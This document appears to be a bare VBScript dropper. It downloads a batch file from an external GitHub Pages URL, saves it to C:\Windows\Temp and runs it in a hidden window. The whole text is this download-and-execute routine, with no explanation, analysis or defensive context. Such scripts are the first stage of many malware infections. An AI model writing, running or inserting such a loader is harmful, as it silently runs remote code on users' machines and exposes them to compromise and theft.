Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", "https://ericros8.github.io/download.bat", False
objXMLHTTP.send()
Set objADOStream = CreateObject("ADODB.Stream")
objADOStream.Open
objADOStream.Type = 1
objADOStream.Write objXMLHTTP.responseBody
objADOStream.Position = 0
objADOStream.SaveToFile "C:\Windows\Temp\download.bat"
objADOStream.Close
Set objShell = CreateObject("WScript.Shell")
objShell.Run "C:\Windows\Temp\download.bat", 0, True
